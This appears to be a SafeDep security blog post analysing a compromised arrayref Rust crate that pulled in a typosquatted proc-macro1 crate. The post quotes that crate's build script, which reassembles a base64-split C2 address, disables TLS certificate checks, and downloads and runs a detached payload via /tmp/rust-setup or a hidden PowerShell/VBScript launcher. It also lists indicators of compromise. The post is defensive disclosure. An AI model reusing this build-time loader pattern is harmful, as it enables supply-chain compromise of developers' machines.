---
title: Malicious Rust Crate arrayref Runs a Build-Time Payload - Real-time Open Source Software Supply Chain Security
url: https://safedep.io/arrayref-proc-macro1-rust-build-time-malware/
site_name: hackernews_api
content_file: hackernews_api-malicious-rust-crate-arrayref-runs-a-build-time-pa
fetched_at: '2026-08-21T06:51:36.896472'
original_url: https://safedep.io/arrayref-proc-macro1-rust-build-time-malware/
author: abhisek
date: '2026-08-20'
description: A compromised release of the popular Rust crate arrayref pulled in a typosquatted proc-macro1 whose build script downloads and runs a remote binary at compile…
tags:
- hackernews
- trending
---

Back to Blog
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

# Malicious Rust Crate arrayref Runs a Build-Time Payload

 
 
 
 
 
* Malware
* Security
 
 
 
 
 
 
 
 
 
 
 SafeDep Team 
 
 
•
 
 Aug 20, 2026 
 
•
 
7 min read
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
On this page
 
 6 sections

 
 
 
 
 

On this page

 
 
 
 
 
 
 
 
 
 
 

## Summary

On August 20, 2026, a compromised release of the popular Rust cratearrayrefappeared on
crates.io. Version 0.3.10 added a dependency on a typosquatted crate calledproc-macro1, whose build script downloads and runs a remote binary while a project compiles.
The code runs at build time, so simply compiling a project that pulled the bad versions is enough
to trigger it. The crates.io team has since removed the malicious versions.

## Packages involved

The genuinearrayrefandappend-only-veccrates are maintained bydroundy, whose account
appears to have been compromised. The corresponding GitHub repositories are no longer available.github.com/droundy/arrayref,github.com/droundy/append-only-vec, and the entiregithub.com/droundyaccount all return 404,
so the upstream code is no longer available for inspection. A separate account,dtolney, publishedproc-macro1.
The username closely resembles David Tolnay’s realdtolnayaccount. Its metadata forgesauthors = ["David Tolnay <[email protected]>"]and pointsrepositoryat adtolnay/proc-macro1path that returns 404.

Crate
Version
Publisher
Status
arrayref
0.3.10
droundy
 (compromised)
Malicious, removed
internment
0.8.7
droundy
 (compromised)
Malicious, removed
append-only-vec
0.1.9
droundy
 (compromised)
Malicious, removed
proc-macro1
all versions
dtolney
 (impersonation)
Malicious typosquat, entire crate removed
proc-macro-en
all versions
Malicious dependency crate, removed
aovine
all versions
Malicious dependency crate, removed
arone
all versions
Malicious dependency crate, removed
aronenao
all versions
Malicious dependency crate, removed
tinymember
all versions
Malicious dependency crate, removed

Note thatproc-macro1is notproc-macro2. The real crate that macro authors depend on isproc-macro2. Thesrc/of the maliciousproc-macro1is a genuine copy ofproc-macro2, so builds kept working while the build script ran.

## What the build script does

The payload lives in the build script ofproc-macro11.0.107. It stores its server address as
base64 fragments and reassembles them at build time, quoted in the advisory:

1
// proc-macro1-1.0.107/build.rs (quoted in rustsec/advisory-db#3161)
2
const
 
SRC_URL_PARTS
:
 
&
[
&
str
] 
=
3
 
&
[
"aHR0cHM6Ly8="
, 
"MjMuMjU0Lg=="
, 
"MTY1Lg=="
, 
"MTEyOg=="
, 
"OTA4OS8="
];
4
const
 
END_URL_PARTS
:
 
&
[
&
str
] 
=
5
 
&
[
"MjMuMjU0Lg=="
, 
"MTY1Lg=="
, 
"MTEyOg=="
, 
"NDQz"
];

Decoded, those fragments produce the payload hosthxxps://23[.]254[.]165[.]112:9089/and the
command and control address23[.]254[.]165[.]112:443. The script fetches an architecture-specific
binary over a TLS connection that accepts any certificate without validation, then runs it detached
from the build. On Unix it drops and runs/tmp/rust-setup. On Windows it writes a PowerShell
script and a VBScript launcher under%TEMP%and starts them hidden, then abandons
the child process so the compiler does not wait for it.

## How it spread

The owner account yanked the olderarrayrefreleases 0.3.5 through 0.3.9. Yanking a
crate makes Cargo print a “consider updating to a version that is not yanked” warning, which nudges
developers toward the only non-yanked release, the malicious 0.3.10. The reporter who filed theRustSec advisorynoted this is how they hit
it.

arrayrefis widely used as a transitive dependency. It sits deep in common Rust graphs throughtiny-skia,sctk-adwaita, andwinit, which places it under most GUI work built on egui,
eframe, and iced. The crate has about 245 million all-time downloads (244,989,384 at time of
writing), with the clean 0.3.9 release accounting for roughly 152 million. Those numbers measure
how widely the crate is used rather than a count of affected builds.

## Indicators of compromise

Type
Indicator
Detail
Network
23.254.165.112:9089
Payload host (HTTPS)
Network
23.254.165.112:443
C2, passed to the payload as argv[1]
File (Unix)
/tmp/rust-setup
Downloaded executable
File (Windows)
%TEMP%\rust-setup.ps1
Downloaded PowerShell script
File (Windows)
%TEMP%\rust-setup-launch.vbs
VBScript launcher
Second-stage names
rust-crate_0.1.0
, 
_0.2.0
, 
_0.3.0
, 
_0.4.0
Chosen by OS and architecture

SHA256 of the removed crate artifacts:

Artifact
SHA256
arrayref
 0.3.10
25ad700976873c76af785cb99b33c48db7df8b81f21d1e9e06b3676b9a9373ae
proc-macro1
 1.0.107
61198155da51b838772eecf5bfaac6cbc4dcc388dccc56658fc28a8e831b34d4
proc-macro1
 1.0.106
b5c1b5b0763a8809a644a8f92224653f0aca623a98eecc714d27f74b80fbe436

## Part 2: Technical Analysis

Our technical analysis covers the two crates behind this incident,arrayref0.3.10 andproc-macro11.0.107.arrayref0.3.10 pulls in a dependency calledproc-macro1. The malicious
code is in the build script ofproc-macro1, not inarrayrefitself.

### The injection point in arrayref

arrayrefis a small crate of four macros. Up to 0.3.9 it has no build script and no runtime
dependencies. Version 0.3.10 keeps that macro source and adds one line to the manifest:

arrayref-0.3.10/Cargo.toml
1
[
package
]
2
name = 
"arrayref"
3
version = 
"0.3.10"
4
build = 
false
5

6
[
dependencies
.
proc-macro1
]
7
version = 
"1.0.107"

This[dependencies.proc-macro1]entry is sufficient to introduce the malicious crate. The requirement1.0.107is a caret
range, and with only 1.0.106 and 1.0.107 ever published it resolves to the malicious 1.0.107. The
crate’s ownsrc/lib.rsis the ordinary macro code, for example thearray_ref!macro:

arrayref-0.3.10/src/lib.rs
1
#[macro_export]
2
macro_rules!
 
array_ref
 {
3
 
(
$
arr
:
expr, 
$
offset
:
expr, 
$
len
:
expr) 
=>
 {{
4
 
{
5
 
#[inline]
6
 
const
 
unsafe
 
fn
 
as_array
<
T
>(slice
:
 
&
[
T
]) 
->
 
&
[
T
; 
$
len] {
7
 
&*
(slice
.
as_ptr
() 
as
 
*const
 [_; 
$
len])
8
 
}
9
 
let
 offset 
=
 
$
offset;
10
 
let
 slice 
=
 
&$
arr[offset
..
offset 
+
 
$
len];
11
 
#[allow(unused_unsafe)]
12
 
unsafe
 {
13
 
as_array
(slice)
14
 
}
15
 
}
16
 
}};
17
}

Nothing in thearrayrefsource referencesproc-macro1, and it does not need to. Cargo builds
every declared non-optional dependency, whether or not the code uses it. So the manifest entry alone
makes Cargo fetch and buildproc-macro1whenever a project pulls inarrayref0.3.10, and building
it runs the malicious build script.

### proc-macro1 is a renamed copy of proc-macro2

Thesrc/ofproc-macro1is proc-macro2 with a mechanical find-and-replace ofproc-macro2toproc-macro1. The rename reaches into documentation links and even copied issue references, for
examplehtml_root_url = "https://docs.rs/proc-macro1/1.0.107"insrc/lib.rsand agithub.com/dtolnay/proc-macro1/issues/235link insrc/fallback.rs. Because the library code is
real proc-macro2, the crate works as a drop-in. This makes the malicious crate less noticeable
during a normal build.

The package metadata forges an identity:

proc-macro1-1.0.107/Cargo.toml
1
authors = [
"David Tolnay <
[email protected]
>"
]
2
repository = 
"https://github.com/dtolnay/proc-macro1"

The email[email protected]is not David Tolnay’s, and thedtolnay/proc-macro1repository
returns 404. The suspicious difference is in the build dependencies, which real proc-macro2 does not
have:

proc-macro1-1.0.107/Cargo.toml
1
[
build-dependencies
.
base64
]
2
version = 
"0.22"
3

4
[
build-dependencies
.
rustls
]
5
version = 
"0.23"
6
features = [
"ring"
, 
"std"
, 
"tls12"
]
7
default-features = 
false
8

9
[
build-dependencies
.
ureq
]
10
version = 
"2"
11
features = [
"tls"
]
12
default-features = 
false

Those three crates give the build script base64 decoding, a TLS stack, and an HTTP client. These
dependencies are unusual for a token-parsing library, and the malicious build script uses them.

### The build script payload

The build script splits the server address into base64 fragments and rebuilds it at compile time, so
the raw string never appears in the source:

proc-macro1-1.0.107/build.rs
1
const
 
SRC_URL_PARTS
:
 
&
[
&
str
] 
=
 
&
[
"aHR0cHM6Ly8="
, 
"MjMuMjU0Lg=="
, 
"MTY1Lg=="
, 
"MTEyOg=="
, 
"OTA4OS8="
];
2
const
 
END_URL_PARTS
:
 
&
[
&
str
] 
=
 
&
[
"MjMuMjU0Lg=="
, 
"MTY1Lg=="
, 
"MTEyOg=="
, 
"NDQz"
];

Decoded,SRC_URL_PARTSishxxps://23[.]254[.]165[.]112:9089/andEND_URL_PARTSis23[.]254[.]165[.]112:443.

The download uses a TLS client that accepts any certificate. TheAcceptAllverifier returns
success from every certificate and signature check in therustlsServerCertVerifiertrait, so a
self-signed certificate on the raw IP passes:

proc-macro1-1.0.107/build.rs
1
impl
 
ServerCertVerifier
 
for
 
AcceptAll
 {
2
 
fn
 
verify_server_cert
(
/* ... */
) 
->
 
Result
<
ServerCertVerified
, rustls
::
Error
> {
3
 
Ok
(
ServerCertVerified
::
assertion
())
4
 
}
5
 
// verify_tls12_signature and verify_tls13_signature also return success unconditionally
6
}

The build script picks the binary to fetch by operating system and architecture. It supports four
targets and aborts the build on anything else:

proc-macro1-1.0.107/build.rs
1
fn
 
link_suffix
() 
->
 
&
'
static
 
str
 {
2
 
match
 (
std
::
env
::
consts
::
OS
, 
std
::
env
::
consts
::
ARCH
) {
3
 
(
"linux"
, 
"x86_64"
) 
=>
 
"rust-crate_0.1.0"
,
4
 
(
"windows"
, 
"x86_64"
) 
=>
 
"rust-crate_0.2.0"
,
5
 
(
"macos"
, 
"x86_64"
) 
=>
 
"rust-crate_0.3.0"
,
6
 
(
"macos"
, 
"aarch64"
) 
=>
 
"rust-crate_0.4.0"
,
7
 
(_, _) 
=>
 
panic!
(
"unsupported platform"
),
8
 
}
9
}

The download and execution run insidemain, before the feature gate and the genuine proc-macro2
configuration logic that follows. There is no feature flag or environment check guarding it, so it
runs on every build on a supported platform:

1
// proc-macro1-1.0.107/build.rs (inside main)
2
let
 url 
=
 
src_download_url
();
3
let
 bytes 
=
 
download_bytes
(
&
url);
4

5
match
 
std
::
env
::
consts
::
OS
 {
6
 
"linux"
 
|
 
"macos"
 
=>
 
run_unix_payload
(bytes),
7
 
"windows"
 
=>
 
run_windows_payload
(bytes),
8
 
os 
=>
 
panic!
(
"unsupported OS: {os}"
),
9
}

On Unix the build script writes the bytes to/tmp/rust-setup, marks the file executable, and spawns
it without waiting, passing the command and control address as the first argument. It sends every
standard stream to null:

proc-macro1-1.0.107/build.rs
1
fn
 
run_unix_payload
(bytes
:
 
Vec
<
u8
>) {
2
 
let
 path 
=
 
PathBuf
::
from
(
"/tmp/rust-setup"
);
3
 
std
::
fs
::
write
(
&
path, 
&
bytes)
.
expect
(
"failed to write payload"
);
4
 
Command
::
new
(
"chmod"
)
.
args
([
"+x"
, path_str])
.
status
()
.
expect
(
"failed to run chmod"
);
5
 
Command
::
new
(
&
path)
6
 
.
arg
(
end_url
())
7
 
.
stdin
(
Stdio
::
null
())
8
 
.
stdout
(
Stdio
::
null
())
9
 
.
stderr
(
Stdio
::
null
())
10
 
.
spawn
()
11
 
.
expect
(
"failed to spawn payload"
);
12
}

On Windows the fetched bytes are a PowerShell script. The build script writes them to%TEMP%\rust-setup.ps1and starts them through a VBScript launcher underwscript.exe, with a
comment in the source explaining why:

proc-macro1-1.0.107/build.rs
1
// ShellExecute via WScript escapes Cargo's job object; spawned children otherwise
2
// keep the build script (and `cargo build`) waiting until they exit.
3
let
 vbs 
=
 
format!
(
4
 
r#"CreateObject("Wscript.Shell").Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File ""{script}"" ""{end}""", 0, False"#
,
5
 
script 
=
 script_path
.
display
(),
6
 
end 
=
 
end_url
(),
7
);
8
// ...
9
let
 child 
=
 
Command
::
new
(
"wscript.exe"
)
10
 
.
args
([
"//B"
, 
"//Nologo"
, launcher_str])
11
 
.
creation_flags
(
CREATE_NO_WINDOW
)
12
 
.
spawn
()
13
 
.
expect
(
"failed to spawn wscript launcher"
);
14
std
::
mem
::
forget
(child);

The launcher runs hidden and does not wait for the process. The source comment states that routing
through WScript is what escapes Cargo’s job object, so PowerShell keeps running after the build
finishes. The finalstd::mem::forgetleaks thewscriptchild handle so its destructor never
runs. Together this detaches the payload from Cargo. This allows the payload to continue without
blocking the Cargo build.

 
 
 
 
 
* rust
* cargo
* oss
* malware
* supply-chain
* security
 
 
 
 
 
 
 
 
 
 
 
 
 

### Author

 
 
 
 
 
 

#### SafeDep Team

 

safedep.io

 
 
 
 
 
 

### Share

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

## The Latest fromSafeDep blogs

 
 
 
 

Follow for the latest updates and insights on open source security & engineering

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
* Malware
 
 
 
 

A YouTube video ad impersonating TradingView delivered a fake .pkg installer. Inside: a self-healing LaunchAgent, an AES-encrypted V8 bytecode payload, and a Node.js MITM proxy trusted by a rogue...

 
 
 
 
 
 
 
 
 
 
 
 
* Malware
 
 
 
 

A growing npm campaign uses forks of the Baileys WhatsApp library to make developers' own accounts follow attacker channels, inflating follower counts and injecting advertising.

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
* Malware
* Security
 
 
 
 

21 malicious npm packages targeted Google by squatting CLI binary names from scoped packages, not package names. The technique exploits a structural gap that standard dependency confusion defenses do...

 
 
 
 
 
 
 
 
 
 
 
 
* Malware
 
 
 
 

An npm worm published 2,234 poisoned versions across 444 package names. Its install script stole credentials and ran a command when GitHub revoked a token.

 
 
 
 
 
 View All Blogs 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

## Ship Code.

 

## Not Malware.

 
 
 

Start free with open source tools on your machine. Scale to a unified platform for your organization.

 
 
 
 
 Star on GitHub 
 

Book a Demo